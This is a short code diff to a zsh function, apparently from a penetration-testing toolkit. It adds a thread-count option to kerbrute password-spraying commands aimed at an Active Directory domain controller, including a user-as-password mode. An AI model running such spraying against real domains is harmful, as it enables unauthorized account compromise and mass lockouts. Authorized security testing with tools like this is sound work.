@@ -299,6 +299,9 @@ nb-ad-rce-pass-spray() {
     __check-project
     nb-vars-set-domain
 
+    __ask "Enter number of threads (default 10)"
+    __check-threads
+
 	  __ask "Enter the IP address of the target DC controller"
     nb-vars-set-dchost
 
@@ -312,9 +315,9 @@ nb-ad-rce-pass-spray() {
     local ua && __askvar ua USER_AS_PASS
 
     if [[ $ua == "y" ]]; then
-      print -z "kerbrute passwordspray -d ${__DOMAIN} --dc ${__DCHOST} $ul '$pw' --user-as-pass -o $(__dcpath)/kerbrute-password-spray.txt"
+      print -z "kerbrute passwordspray -d ${__DOMAIN} -t ${__THREADS} --dc ${__DCHOST} $ul '$pw' --user-as-pass -o $(__dcpath)/kerbrute-password-spray.txt"
     elif [[ $ua == "n" ]]; then
-      print -z "kerbrute passwordspray -d ${__DOMAIN} --dc ${__DCHOST} $ul '$pw' -o $(__dcpath)/kerbrute-password-spray.txt"
+      print -z "kerbrute passwordspray -d ${__DOMAIN} -t ${__THREADS} --dc ${__DCHOST} $ul '$pw' -o $(__dcpath)/kerbrute-password-spray.txt"
     else
       echo
       __err "Invalid option. Please choose 'y' or 'n'."
